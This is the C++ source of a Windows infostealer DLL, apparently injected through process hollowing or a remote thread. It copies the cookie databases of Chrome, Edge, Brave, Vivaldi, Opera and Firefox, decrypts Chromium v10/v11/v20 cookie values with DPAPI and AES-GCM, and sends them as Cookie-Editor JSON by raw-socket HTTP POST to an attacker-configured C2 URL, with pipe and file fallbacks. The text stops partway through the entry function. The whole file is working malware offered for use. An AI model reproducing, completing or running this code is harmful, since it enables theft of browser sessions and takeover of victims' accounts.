// ckdll.cpp - payload DLL: extracts cookies (Firefox plaintext + Chromium v10/v11/v20)
//   and exfiltrates them as Cookie-Editor JSON via HTTP POST (Winsock2) or local fallback.
//
// CRT-less: /NODEFAULTLIB /ENTRY:payload_entry /DYNAMICBASE:NO /BASE:0x5F000000
// Optimizer off (/Od /Oi-): SSE-vectorized memcpy/memset crashes in hollowed process.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>

// No CRT intrinsics (/Oi- in build.bat): memcpy/memset/memmove are our own functions.
// This avoids LNK2001 (no vcruntime.lib) and C2084 (no conflict with intrinsic).
extern "C" void* memmove(void* d, const void* s, size_t n){ char*a=(char*)d; const char*b=(const char*)s;
    if(a<b) for(size_t i=0;i<n;i++) a[i]=b[i];
    else for(size_t i=n;i>0;) { i--; a[i]=b[i]; } return d; }
extern "C" void* memcpy(void* d, const void* s, size_t n){ char*a=(char*)d; const char*b=(const char*)s;
    for(size_t i=0;i<n;i++) a[i]=b[i]; return d; }
extern "C" void* memset(void* d, int c, size_t n){ unsigned char*a=(unsigned char*)d;
    for(size_t i=0;i<n;i++) a[i]=(unsigned char)c; return d; }
// strchr/strstr: without CRT we implement locally with custom names to avoid header conflict
static const char* xstrchr(const char* s, int c){ for(; *s; s++) if(*s==(char)c) return s; return 0; }
static const char* xstrstr(const char* s, const char* sub){
    if(!*sub) return s;
    for(; *s; s++){ const char* a=s; const char* b=sub;
        while(*a&&*b&&*a==*b){ a++; b++; } if(!*b) return s; }
    return 0;
}
extern "C" int _fltused = 0;

// ------------------------------------------------------------------ C2 exfiltration URL
// Sentinel: pick.py finds these 14 bytes in loader.exe (which embeds the DLL as g_payload[])
// and overwrites 256 bytes with the attacker's C2 URL (e.g. http://10.0.0.5:9090/).
// If the sentinel is intact ("CKC2_DEADBEEF_"), no C2 is configured -> local fallback.
static char g_c2_url[256] = "CKC2_DEADBEEF_";

// ------------------------------------------------------------------ JSON output buffer
static char  g_out[512*1024];
static size_t g_len;
static bool   g_first_rec = true;                          // controls comma in JSON array
static void Put(const char* s, size_t n){ if(g_len+n<sizeof(g_out)-1){ memcpy(g_out+g_len,s,n); g_len+=n; } }
static void PutS(const char* s){ Put(s, lstrlenA(s)); }
static void RecStart(void){ if(g_first_rec){ PutS("{"); g_first_rec=false; } else PutS(",{"); }
static void PutJ(const char* s, int n){            // escape string from sqlite
    PutS("\"");
    for(int i=0;i<n;i++){ unsigned char c=(unsigned char)s[i];
        if(c=='"'||c=='\\'){ Put("\\",1); Put((char*)&c,1); }
        else if(c=='\n') Put("\\n",2); else if(c=='\r') Put("\\r",2); else if(c=='\t') Put("\\t",2);
        else if(c<32||c>127){ char t[8]; for(int j=0;j<4;j++){ const char*H="0123456789abcdef";
            t[j]=H[(c>>((3-j)*4))&15]; } Put("\\u00",4); Put(t,4); }
        else Put((char*)&c,1); }
    PutS("\"");
}
static void PutN(long long v){ char b[24]; int i=20; if(!v){ Put("0",1); return; }
    bool neg=v<0; unsigned long long uv=neg?-(unsigned long long)v:(unsigned long long)v;
    while(uv){ b[i--]="0123456789"[uv%10]; uv/=10; }
    if(neg) b[i--]='-';
    Put(b+i+1, 20-i); }

// ------------------------------------------------------------------ debug logging
#ifdef DEBUG
static void Dbg(const char* msg){
    HANDLE h=CreateFileW(L"C:\\ProgramData\\cookielog\\debug.log",GENERIC_WRITE,
                         FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,0,NULL);
    if(h!=INVALID_HANDLE_VALUE){
        SetFilePointer(h,0,NULL,FILE_END); DWORD wr;
        const char* p=msg; while(*p) p++;
        WriteFile(h,msg,(DWORD)(p-msg),&wr,NULL);
        WriteFile(h,"\r\n",2,&wr,NULL); CloseHandle(h);
    }
}
static void DbgStr(const char* prefix, const char* val){
    char buf[1400]; lstrcpyA(buf,prefix); lstrcatA(buf,val); Dbg(buf);
}
static void DbgInt(const char* msg, int val){
    char buf[300]; int j=0;
    while(msg[j] && j<250) { buf[j]=msg[j]; j++; }
    buf[j++]=':'; buf[j++]=' ';
    if(val<0){ buf[j++]='-'; val=-val; }
    char tmp[16]; int t=0;
    if(val==0) tmp[t++]='0';
    else while(val>0){ tmp[t++]='0'+val%10; val/=10; }
    while(t>0) buf[j++]=tmp[--t];
    buf[j]=0; Dbg(buf);
}
#else
#define Dbg(x)    do{}while(0)
#define DbgStr(x,y) do{}while(0)
#define DbgInt(x,y) do{}while(0)
#endif

// ------------------------------------------------------------------ dynamically-loaded APIs
static HMODULE g_sql, g_bc, g_c32;
typedef int  (__cdecl *tOpenV2)(const char*,void**,int,const char*);
typedef int  (__cdecl *tPrep16)(void*,const void*,int,void**,const void**);
typedef int  (__cdecl *tStep)(void*);  typedef int (__cdecl *tInt)(void*,int);
typedef long long (__cdecl *tInt64)(void*,int);
typedef const void* (__cdecl *tBlob)(void*,int); typedef int (__cdecl *tBytes)(void*,int);
typedef int  (__cdecl *tFin)(void*);   typedef int (__cdecl *tClose)(void*);
static tOpenV2 S_open; static tPrep16 S_prep; static tStep S_step; static tInt S_int;
static tInt64 S_int64;
static tBlob S_blob; static tBytes S_bytes; static tFin S_fin; static tClose S_close;

static bool Sqlite(void){
    g_sql = LoadLibraryA("winsqlite3.dll"); if(!g_sql) return false;
    S_open =(tOpenV2) GetProcAddress(g_sql,"sqlite3_open_v2");
    S_prep =(tPrep16) GetProcAddress(g_sql,"sqlite3_prepare16_v2");
    S_step =(tStep)   GetProcAddress(g_sql,"sqlite3_step");
    S_int  =(tInt)    GetProcAddress(g_sql,"sqlite3_column_int");
    S_int64=(tInt64)  GetProcAddress(g_sql,"sqlite3_column_int64");
    S_blob =(tBlob)   GetProcAddress(g_sql,"sqlite3_column_blob");
    S_bytes=(tBytes)  GetProcAddress(g_sql,"sqlite3_column_bytes");
    S_fin  =(tFin)    GetProcAddress(g_sql,"sqlite3_finalize");
    S_close=(tClose)  GetProcAddress(g_sql,"sqlite3_close");
    return S_open && S_prep && S_step && S_blob && S_int64;
}

// DPAPI (CryptUnprotectData) - used for Chromium v10/v11 cookie key
static bool Dpapi(const unsigned char* in, DWORD nin, unsigned char* out, DWORD* nout, bool machine){
    g_c32 = g_c32 ? g_c32 : LoadLibraryA("crypt32.dll"); if(!g_c32) return false;
    typedef BOOL (WINAPI *tCU)(DATA_BLOB*,LPWSTR*,DATA_BLOB*,void*,void*,DWORD,DATA_BLOB*);
    tCU p = (tCU) GetProcAddress(g_c32, "CryptUnprotectData"); if(!p) return false;
    DATA_BLOB i = { nin, (BYTE*)in }, o = {0,NULL};
    if(!p(&i,NULL,NULL,NULL,NULL, machine?CRYPTPROTECT_LOCAL_MACHINE:0, &o)) return false;
    DWORD n = o.cbData > *nout ? *nout : o.cbData; memcpy(out,o.pbData,n); *nout=n;
    LocalFree(o.pbData); return true;
}

// AES-256-GCM decryption via CNG (BCrypt*)
static bool AesGcm(const unsigned char* key, ULONG klen, const unsigned char* iv,
                   const unsigned char* ct, ULONG clen, const unsigned char* tag,
                   unsigned char* out, ULONG outcap, ULONG* nout){
    typedef NTSTATUS(WINAPI *tOpen)(BCRYPT_ALG_HANDLE*,LPCWSTR,ULONG);
    typedef NTSTATUS(WINAPI *tGen)(BCRYPT_ALG_HANDLE,BCRYPT_KEY_HANDLE*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG);
    typedef NTSTATUS(WINAPI *tSet)(BCRYPT_ALG_HANDLE,LPCWSTR,PUCHAR,ULONG,ULONG);
    typedef NTSTATUS(WINAPI *tDec)(BCRYPT_KEY_HANDLE,PUCHAR,ULONG,void*,
                 PUCHAR,ULONG,PUCHAR,ULONG,ULONG*,ULONG);
    typedef NTSTATUS(WINAPI *tDelK)(BCRYPT_KEY_HANDLE);
    typedef NTSTATUS(WINAPI *tClose)(BCRYPT_ALG_HANDLE,ULONG);
    g_bc = g_bc ? g_bc : LoadLibraryA("bcrypt.dll"); if(!g_bc) return false;
    tOpen  a=(tOpen )GetProcAddress(g_bc,"BCryptOpenAlgorithmProvider");
    tGen   g=(tGen  )GetProcAddress(g_bc,"BCryptGenerateSymmetricKey");
    tSet   s=(tSet  )GetProcAddress(g_bc,"BCryptSetProperty");
    tDec   d=(tDec  )GetProcAddress(g_bc,"BCryptDecrypt");
    tDelK  dk=(tDelK)GetProcAddress(g_bc,"BCryptDestroyKey");
    tClose cl=(tClose)GetProcAddress(g_bc,"BCryptCloseAlgorithmProvider");
    if(!a||!g||!s||!d) return false;
    BCRYPT_ALG_HANDLE alg=NULL; BCRYPT_KEY_HANDLE k=NULL; NTSTATUS st;
    st = a(&alg,BCRYPT_AES_ALGORITHM,0); if(st) return false;
    st = s(alg,BCRYPT_CHAINING_MODE,(PUCHAR)BCRYPT_CHAIN_MODE_GCM,
           (ULONG)(lstrlenW(BCRYPT_CHAIN_MODE_GCM)+1)*sizeof(WCHAR),0);
    if(st){ if(cl)cl(alg,0); return false; }
    st = g(alg,&k,NULL,0,(PUCHAR)key,klen,0); if(st){ if(cl)cl(alg,0); return false; }
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    memset(&info,0,sizeof(info));
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = (PUCHAR)iv; info.cbNonce = 12;
    info.pbTag   = (PUCHAR)tag; info.cbTag  = 16;
    if(clen>outcap){ if(dk)dk(k); if(cl)cl(alg,0); return false; }
    ULONG need=0;
    // GCM: plaintext size = ciphertext size; single call suffices (tag verified on decrypt)
    st = d(k,(PUCHAR)ct,clen,&info,NULL,0,out,outcap,&need,0);
    if(dk)dk(k); if(cl)cl(alg,0);
    if(st) return false;
    *nout = need;
    return true;
}

// ------------------------------------------------------------------ JSON field helpers (per sqlite column)
static void FieldI(const char* k, void* st, int col){ PutS(",\""); PutS(k); PutS("\":"); PutN(S_int(st,col)); }
static void FieldI64(const char* k, void* st, int col){ PutS(",\""); PutS(k); PutS("\":"); PutN(S_int64(st,col)); }
static void FieldS(const char* k, void* st, int col){
    const char* t = (const char*) S_blob(st,col); int n = S_bytes(st,col);
    PutS(",\""); PutS(k); PutS("\":"); if(t&&n>0) PutJ(t,n); else PutS("\"\"");
}
// FieldS0: first field of a record (no leading comma)
static void FieldS0(const char* k, void* st, int col){
    const char* t = (const char*) S_blob(st,col); int n = S_bytes(st,col);
    PutS("\""); PutS(k); PutS("\":"); if(t&&n>0) PutJ(t,n); else PutS("\"\"");
}
static void FieldStr(const char* k, const char* v){ PutS(",\""); PutS(k); PutS("\":\""); PutS(v); PutS("\""); }
static void FieldB(const char* k, int v){ PutS(",\""); PutS(k); PutS("\":"); PutS(v?"true":"false"); }

// Convert wide string to UTF-8; fallback to ASCII replacement
static int ToUtf8(const wchar_t* p, char* out, int cap){
    int n = WideCharToMultiByte(CP_UTF8, 0, p, -1, out, cap, NULL, NULL);
    if(n > 0) return n-1;
    int j=0;
    for(int i=0; p[i] && j<cap-1; i++) out[j++]=(char)(p[i]<128?p[i]:'?');
    out[j]=0; return j;
}

// Copy a SQLite database (and -wal/-shm companions) to %TEMP%\ck_db.tmp
// This bypasses browser file locks (browsers hold exclusive locks on live cookie DBs)
static bool CopyDb(const wchar_t* src, wchar_t* dst, int dst_cap){
    wchar_t tmp[MAX_PATH]; GetTempPathW(MAX_PATH, tmp);
    lstrcpyW(dst, tmp); lstrcatW(dst, L"ck_db.tmp");
    DeleteFileW(dst);
    if(!CopyFileW(src, dst, FALSE)) return false;
    wchar_t s2[MAX_PATH], d2[MAX_PATH];
    lstrcpyW(s2, src); lstrcatW(s2, L"-wal"); lstrcpyW(d2, dst); lstrcatW(d2, L"-wal");
    DeleteFileW(d2); CopyFileW(s2, d2, FALSE);
    lstrcpyW(s2, src); lstrcatW(s2, L"-shm"); lstrcpyW(d2, dst); lstrcatW(d2, L"-shm");
    DeleteFileW(d2); CopyFileW(s2, d2, FALSE);
    return true;
}

// ------------------------------------------------------------------ browser profiles
struct Br { const wchar_t* name; const wchar_t* rel; };
static Br g_br[] = { {L"chrome",  L"\\Google\\Chrome\\User Data"},
                     {L"edge",    L"\\Microsoft\\Edge\\User Data"},
                     {L"brave",   L"\\BraveSoftware\\Brave-Browser\\User Data"},
                     {L"vivaldi", L"\\Vivaldi\\User Data"},
                     {L"opera",   L"\\Opera Software\\Opera Stable"} };

static unsigned char g_key10[32]; static bool g_has10;   // v10/v11 key (DPAPI user)
static unsigned char g_key20[32]; static bool g_has20;   // v20 key (app-bound, pre-extracted)

// Parse Local State JSON to extract os_crypt.encrypted_key (v10) and app_bound_encrypted_key (v20)
static void LoadLocalState(const wchar_t* root){
    Dbg("LoadLocalState: entry");
    g_has10 = g_has20 = false;
    wchar_t ls[1024]; lstrcpyW(ls,root); lstrcatW(ls,L"\\Local State");
    HANDLE h = CreateFileW(ls,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(h==INVALID_HANDLE_VALUE){ Dbg("LoadLocalState: no Local State, return"); return; }
    Dbg("LoadLocalState: reading file");
    static char buf[256*1024]; DWORD rd=0; ReadFile(h,buf,sizeof(buf)-1,&rd,NULL);
    Dbg("LoadLocalState: ReadFile done");
    CloseHandle(h);
    Dbg("LoadLocalState: CloseHandle done");
    buf[rd]=0;
    Dbg("LoadLocalState: buf null-terminated");
    char* oc = (char*)xstrstr(buf,"\"os_crypt\""); if(!oc){ Dbg("LoadLocalState: no os_crypt"); return; }
    Dbg("LoadLocalState: found os_crypt");
    char* e10 = (char*)xstrstr(oc,"\"encrypted_key\"");
    char* e20 = (char*)xstrstr(oc,"\"app_bound_encrypted_key\"");
    Dbg("LoadLocalState: searched keys");
    struct { const char* tag; unsigned char* key; bool* ok; } want[2] =
        { {0,g_key10,&g_has10}, {0,g_key20,&g_has20} };
    const char* src[2] = { e10, e20 };
    for(int w=0; w<2; w++){
        if(!src[w]) continue;
        Dbg("LoadLocalState: processing key");
        const char* q1 = xstrchr(src[w],'"');
        Dbg("LoadLocalState: q1 done");
        if(!q1) continue;
        const char* c  = xstrchr(q1,':');
        Dbg("LoadLocalState: colon done");
        if(!c) continue;
        const char* q2 = xstrchr(c,'"');
        Dbg("LoadLocalState: q2 done");
        if(!q2) continue;
        const char* q3 = xstrchr(q2+1,'"');
        Dbg("LoadLocalState: q3 done");
        if(!q3) continue;
        int n = (int)(q3-q2-1);
        Dbg("LoadLocalState: n computed");
        if(n<=5||n>512){ Dbg("LoadLocalState: n out of range, skip"); continue; }
        Dbg("LoadLocalState: before b64 copy");
        char b64[600];
        b64[0] = 'X';
        Dbg("LoadLocalState: b64[0]=X ok (stack writable)");
        char tmp = q2[1];
        Dbg("LoadLocalState: q2[1] read ok");
        b64[0] = tmp;
        Dbg("LoadLocalState: single byte copy ok");
        { for(int i=0;i<n;i++) b64[i]=q2[1+i]; b64[n]=0; }
        Dbg("LoadLocalState: b64 copied, calling CryptStringToBinaryA");
        static unsigned char raw[512]; DWORD rl = (DWORD)sizeof(raw);
        if(!CryptStringToBinaryA(b64,0,CRYPT_STRING_BASE64,NULL,&rl,NULL,NULL) || rl>sizeof(raw)) continue;
        CryptStringToBinaryA(b64,0,CRYPT_STRING_BASE64,raw,&rl,NULL,NULL);
        Dbg("LoadLocalState: b64 decoded OK");
        if(w==0){                                                    // v10/v11: user DPAPI
            if(raw[0]=='D'&&raw[1]=='P'&&raw[2]=='A'&&raw[3]=='P'&&raw[4]=='I'){ rl=32;
                g_has10 = Dpapi(raw+5,rl-5,g_key10,&rl,false)&&rl>=16; }
        } else {                                                     // v20: read pre-extracted key
            HANDLE k = CreateFileW(L"C:\\ProgramData\\cookielog\\v20.key",GENERIC_READ,
                                   FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
            if(k!=INVALID_HANDLE_VALUE){ char b[64]={0}; DWORD r2=0;
                ReadFile(k,b,44,&r2,NULL); CloseHandle(k);
                if(r2==44){ rl=32; if(CryptStringToBinaryA(b,0,CRYPT_STRING_BASE64,g_key20,&rl,NULL,NULL))
                    g_has20 = rl==32; } }
        }
    }
    Dbg("LoadLocalState: done");
}

// Decrypt a single Chromium cookie value
// Format: "v10" or "v20" prefix (3 bytes) + 12-byte nonce + ciphertext + 16-byte GCM tag
// v20 has an additional 32-byte SHA256 domain hash prefix in the plaintext
static bool DecCookie(const unsigned char* enc, int n, unsigned char* out, int* on){
    if(n<31) return false;
    const unsigned char* k = g_key10;
    bool isv20 = (enc[0]=='v'&&enc[1]=='2'&&enc[2]=='0');
    if(isv20){ if(!g_has20) return false; k=g_key20; }
    else if(enc[0]=='v'&&(enc[1]=='0'||enc[1]=='1')){ if(!g_has10) return false; k=g_key10; }
    else return false;
    ULONG got=0;
    if(!AesGcm(k,32,enc+3,enc+15,n-15-16,enc+n-16,out,n-15-16,&got)) return false;
    int s = isv20 ? 32 : 0;      // v20 has 32-byte SHA256 domain hash prefix in plaintext
    if((int)got < s) return false;
    *on = (int)(got - s); memmove(out,out+s,*on); return true;
}

// Extract cookies from a Chromium-based browser in Cookie-Editor JSON format
static void DumpChromium(const wchar_t* brname, const wchar_t* root){
    Dbg("DumpChromium: entry");
    // FindFirstFile only accepts wildcards in the LAST path component; enumerate profiles first
    wchar_t pat[1024]; lstrcpyW(pat,root); lstrcatW(pat,L"\\*");
    WIN32_FIND_DATAW fd; HANDLE f = FindFirstFileW(pat,&fd);
    if(f==INVALID_HANDLE_VALUE){ Dbg("DumpChromium: no profiles, return"); return; }
    Dbg("DumpChromium: found profiles, iterating");
    do{
        if(!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if(fd.cFileName[0]==L'.') continue;
        // Chrome >=88: Network\Cookies ; pre-88: Cookies directly in profile dir
        const wchar_t* sfx[2] = {L"\\Network\\Cookies", L"\\Cookies"};
        for(int si=0; si<2; si++){
            wchar_t db[1024]; lstrcpyW(db,root); lstrcatW(db,L"\\");
            lstrcatW(db,fd.cFileName); lstrcatW(db,sfx[si]);
            if(GetFileAttributesW(db)==INVALID_FILE_ATTRIBUTES) continue;
            wchar_t tmp_db[MAX_PATH];
            if(!CopyDb(db,tmp_db,MAX_PATH)){ Dbg("DumpChromium: copy failed (browser running?)"); continue; }
            Dbg("DumpChromium: copy OK");
            char path8[1024]; ToUtf8(tmp_db,path8,sizeof(path8));
            DbgStr("DumpChromium: opening ", path8);
            void* con=NULL; int rc=S_open(path8,&con,0x00000001/*SQLITE_OPEN_READONLY*/,NULL);
            if(rc||!con){ DbgInt("DumpChromium: S_open failed", rc); continue; }
            Dbg("DumpChromium: S_open OK");
            void* st=NULL;
            const wchar_t* SQL = L"SELECT host_key,name,path,encrypted_value,expires_utc,"
                                 L"is_secure,is_httponly,samesite FROM cookies;";
            int prc=S_prep(con,SQL,-1,&st,NULL);
            if(prc){ DbgInt("DumpChromium: S_prep failed", prc); S_close(con); continue; }
            Dbg("DumpChromium: S_prep OK, stepping");
            int rows=0;
            while(S_step(st)==100){                                    // SQLITE_ROW
                rows++;
                RecStart();
                FieldS0("domain",st,0); FieldS("name",st,1); FieldS("path",st,2);
                const unsigned char* enc=(const unsigned char*)S_blob(st,3); int en=S_bytes(st,3);
                unsigned char pt[4096]; int pn=0;
                if(enc&&DecCookie(enc,en,pt,&pn)){ PutS(",\"value\":"); PutJ((char*)pt,pn); }
                else { PutS(",\"value\":\"\""); }
                // expires_utc: 64-bit microseconds since 1601 -> Unix epoch
                long long eu = S_int64(st,4);
                long long unix = eu ? eu / 1000000 - 11644473600LL : 0;
                PutS(",\"expirationDate\":"); PutN(unix);
                int ss = S_int(st,7);
                // Chromium sameSite: 2=None, 1=Strict, 0=Lax
                FieldStr("sameSite", ss==2 ? "None" : (ss==1 ? "Strict" : "Lax"));
                FieldB("secure",S_int(st,5));
                FieldB("httpOnly",S_int(st,6));
                // hostOnly: true if domain does not start with "."
                { const char* d=(const char*)S_blob(st,0); FieldB("hostOnly", d && d[0]!='.'); }
                FieldB("session", unix==0);
                PutS("}");
            }
            DbgInt("DumpChromium: rows extracted", rows);
            S_fin(st); S_close(con);
        }
    } while(FindNextFileW(f,&fd));
    FindClose(f);
}

// Extract cookies from Firefox in Cookie-Editor JSON format
static void DumpFirefox(const wchar_t* appdata){
    wchar_t pdir[1024]; lstrcpyW(pdir,appdata); lstrcatW(pdir,L"\\Mozilla\\Firefox\\Profiles");
    if(GetFileAttributesW(pdir)==INVALID_FILE_ATTRIBUTES){ Dbg("DumpFirefox: no Profiles dir"); return; }
    wchar_t pat[1024]; lstrcpyW(pat,pdir); lstrcatW(pat,L"\\*");
    WIN32_FIND_DATAW fd; HANDLE f = FindFirstFileW(pat,&fd);
    if(f==INVALID_HANDLE_VALUE){ Dbg("DumpFirefox: no profiles found"); return; }
    Dbg("DumpFirefox: found profiles, iterating");
    do{
        if(!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if(fd.cFileName[0]==L'.') continue;
        wchar_t db[1024]; lstrcpyW(db,pdir); lstrcatW(db,L"\\"); lstrcatW(db,fd.cFileName);
        lstrcatW(db,L"\\cookies.sqlite");
        if(GetFileAttributesW(db)==INVALID_FILE_ATTRIBUTES) continue;
        wchar_t tmp_db[MAX_PATH];
        if(!CopyDb(db,tmp_db,MAX_PATH)){ Dbg("DumpFirefox: copy failed"); continue; }
        Dbg("DumpFirefox: copy OK");
        char path8[1024]; ToUtf8(tmp_db,path8,sizeof(path8));
        DbgStr("DumpFirefox: opening ", path8);
        void* con=NULL; int rc=S_open(path8,&con,0x00000001/*SQLITE_OPEN_READONLY*/,NULL);
        if(rc||!con){ DbgInt("DumpFirefox: S_open failed", rc); continue; }
        Dbg("DumpFirefox: S_open OK");
        void* st=NULL;
        const wchar_t* SQL = L"SELECT name,value,host,path,expiry,isSecure,isHttpOnly,sameSite FROM moz_cookies;";
        int prc=S_prep(con,SQL,-1,&st,NULL);
        if(prc){ DbgInt("DumpFirefox: S_prep failed", prc); S_close(con); continue; }
        Dbg("DumpFirefox: S_prep OK, stepping");
        int rows=0;
        while(S_step(st)==100){
            rows++;
            RecStart();
            FieldS0("name",st,0); FieldS("value",st,1); FieldS("domain",st,2); FieldS("path",st,3);
            long long expiry = S_int64(st,4);
            PutS(",\"expirationDate\":"); PutN(expiry);
            int ss = S_int(st,7);
            // Firefox sameSite: 0=None, 1=Lax, 2=Strict (opposite of Chromium!)
            FieldStr("sameSite", ss==2 ? "Strict" : (ss==1 ? "Lax" : "None"));
            FieldB("secure",S_int(st,5));
            FieldB("httpOnly",S_int(st,6));
            { const char* d=(const char*)S_blob(st,2); FieldB("hostOnly", d && d[0]!='.'); }
            FieldB("session", expiry==0);
            PutS("}");
        }
        DbgInt("DumpFirefox: rows extracted", rows);
        S_fin(st); S_close(con);
    } while(FindNextFileW(f,&fd));
    FindClose(f);
}

// ------------------------------------------------------------------ HTTP exfiltration (Winsock2)
// WinHTTP/WinINet fail in hollowed process (err 12029 - proxy config unavailable).
// Raw Winsock2 works: socket() + connect() + send() with no config dependency.
#pragma pack(push,1)
struct CK_SOCKADDR_IN {
    short sin_family;       // AF_INET = 2
    unsigned short sin_port; // network byte order (htons)
    unsigned long sin_addr;  // network byte order (inet_addr)
    char sin_zero[8];
};
#pragma pack(pop)
struct CK_WSADATA { char _[400]; };  // minimal WSADATA (400 bytes on stack)

static bool ExfilHTTP(const char* url){
    DbgStr("ExfilHTTP: url=", url);
    // Parse URL: http://HOST[:PORT][/PATH]
    const char* p = url;
    if(p[0]=='h'&&p[1]=='t'&&p[2]=='t'&&p[3]=='p'&&p[4]==':') p+=7; // skip "http://"
    // Extract host[:port]
    char host[128]; int hp=0; int port = 80;
    const char* path = "/";
    while(*p && *p!='/' && hp<127){
        if(*p==':'){
            p++; port=0;
            while(*p>='0'&&*p<='9'){ port=port*10+(*p-'0'); p++; }
            break;
        }
        host[hp++]=*p++;
    }
    host[hp]=0;
    if(*p=='/') path=p;
    DbgStr("ExfilHTTP: host=", host);
    DbgInt("ExfilHTTP: port", port);
    DbgStr("ExfilHTTP: path=", path);

    HMODULE ws2 = LoadLibraryA("ws2_32.dll");
    if(!ws2){ Dbg("ExfilHTTP: ws2_32.dll load FAILED"); return false; }
    typedef int (WINAPI *tWSAStartup)(unsigned short, void*);
    typedef int (WINAPI *tSocket)(int,int,int);
    typedef int (WINAPI *tConnect)(unsigned int, const void*, int);
    typedef int (WINAPI *tSend)(unsigned int, const char*, int, int);
    typedef int (WINAPI *tRecv)(unsigned int, char*, int, int);
    typedef int (WINAPI *tClose)(unsigned int);
    typedef int (WINAPI *tWSACleanup)(void);
    typedef unsigned long (WINAPI *tInetAddr)(const char*);
    tWSAStartup fStart = (tWSAStartup)GetProcAddress(ws2,"WSAStartup");
    tSocket    fSocket = (tSocket)GetProcAddress(ws2,"socket");
    tConnect   fConnect= (tConnect)GetProcAddress(ws2,"connect");
    tSend      fSend   = (tSend)GetProcAddress(ws2,"send");
    tRecv      fRecv   = (tRecv)GetProcAddress(ws2,"recv");
    tClose     fClose  = (tClose)GetProcAddress(ws2,"closesocket");
    tWSACleanup fClean = (tWSACleanup)GetProcAddress(ws2,"WSACleanup");
    tInetAddr  fInet  = (tInetAddr)GetProcAddress(ws2,"inet_addr");
    if(!fStart||!fSocket||!fConnect||!fSend||!fRecv||!fClose||!fInet){ Dbg("ExfilHTTP: missing ws2_32 exports"); return false; }
    Dbg("ExfilHTTP: ws2_32 exports OK");

    CK_WSADATA wsaData;
    if(fStart(0x0202, &wsaData)){ Dbg("ExfilHTTP: WSAStartup failed"); return false; }
    Dbg("ExfilHTTP: WSAStartup OK");

    unsigned int sock = (unsigned int)fSocket(2/*AF_INET*/, 1/*SOCK_STREAM*/, 6/*IPPROTO_TCP*/);
    if(sock==(unsigned int)-1){ Dbg("ExfilHTTP: socket failed"); fClean(); return false; }
    Dbg("ExfilHTTP: socket created");

    CK_SOCKADDR_IN addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = 2; // AF_INET
    addr.sin_port = ((port & 0xFF) << 8) | ((port >> 8) & 0xFF); // htons
    addr.sin_addr = fInet(host);
    if(addr.sin_addr == 0xFFFFFFFF){ Dbg("ExfilHTTP: inet_addr failed"); fClose(sock); fClean(); return false; }

    if(fConnect(sock, &addr, sizeof(addr))){ DbgInt("ExfilHTTP: connect failed", GetLastError()); fClose(sock); fClean(); return false; }
    Dbg("ExfilHTTP: connected!");

    // Build HTTP POST request
    char hdr[512]; int hn = 0;
    #define APP(s) { int ln=lstrlenA(s); memcpy(hdr+hn,s,ln); hn+=ln; }
    APP("POST "); APP(path);
    APP(" HTTP/1.1\r\nHost: "); APP(host);
    APP("\r\nContent-Type: application/json\r\nContent-Length: ");
    // append g_len as decimal string
    { char num[24]; int ni=0; size_t gl=g_len; if(!gl) num[ni++]='0'; else while(gl){ num[ni++]='0'+gl%10; gl/=10; } while(ni) hdr[hn++]=num[--ni]; }
    APP("\r\nConnection: close\r\n\r\n");
    #undef APP

    int sent = fSend(sock, hdr, hn, 0);
    DbgInt("ExfilHTTP: header sent", sent);

    // Send body in 32KB chunks
    size_t off = 0; int chunk = 32768;
    while(off < g_len){
        int toSend = (g_len - off < chunk) ? (int)(g_len - off) : chunk;
        int s = fSend(sock, g_out + off, toSend, 0);
        if(s <= 0) break;
        off += s;
    }
    DbgInt("ExfilHTTP: body sent", (int)off);

    // Read response (discard)
    char resp[256]; fRecv(sock, resp, sizeof(resp), 0);
    Dbg("ExfilHTTP: response received");

    fClose(sock); fClean();
    return off == g_len;
}

// ------------------------------------------------------------------ exfiltration sink
// Priority: 1) HTTP POST to C2 (if sentinel was patched), 2) named pipe, 3) local file
static bool Sink(void){
    PutS("]"); g_out[g_len]=0;

    // 1. If C2 URL is configured (sentinel replaced by pick.py), exfiltrate via HTTP
    if(g_c2_url[0]!='C' || g_c2_url[1]!='K' || g_c2_url[2]!='C' || g_c2_url[3]!='2'){
        Dbg("Sink: exfiltrating via HTTP");
        bool ok = ExfilHTTP(g_c2_url);
        Dbg(ok?"Sink: HTTP OK":"Sink: HTTP FAILED");
        if(ok) return true;
        // fall through to local fallback if HTTP fails
    }

    // 2. Fallback: named pipe (if sink.py is running locally)
    for(int i=0;i<20;i++){
        HANDLE p = CreateFileW(L"\\\\.\\pipe\\ck_pipe",GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
        if(p!=INVALID_HANDLE_VALUE){
            DWORD wr=0; BOOL ok=WriteFile(p,g_out,(DWORD)g_len,&wr,NULL); CloseHandle(p);
            return ok && wr==g_len;
        }
        Sleep(250);
    }

    // 3. Last resort: local file
    CreateDirectoryW(L"C:\\ProgramData\\cookielog",NULL);
    HANDLE h = CreateFileW(L"C:\\ProgramData\\cookielog\\drop.json",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
    if(h==INVALID_HANDLE_VALUE) return false;
    DWORD wr=0; WriteFile(h,g_out,(DWORD)g_len,&wr,NULL); CloseHandle(h); return true;
}

// rundll32 calls this after LoadLibrary (which already triggered payload_entry via DLL_PROCESS_ATTACH).
// This noop exists only so rundll32 doesn't complain about a missing export.
extern "C" __declspec(dllexport) void CALLBACK noop(HWND, HINSTANCE, LPSTR, int) {}

extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD reason, LPVOID)
{
    Dbg("payload_entry: start");
    // LoadLibrary calls: hinst=base, reason=DLL_PROCESS_ATTACH(1), reserved=NULL
    // CreateRemoteThread calls: hinst=arg(1), reason=undefined, reserved=undefined
    // Accept both: reason==1 (LoadLibrary) or h==1 (CreateRemoteThread arg=1)
    if(reason != 1 && (ULONG_PTR)h != 1){ Dbg("payload_entry: not ATTACH, skip"); return 0; }
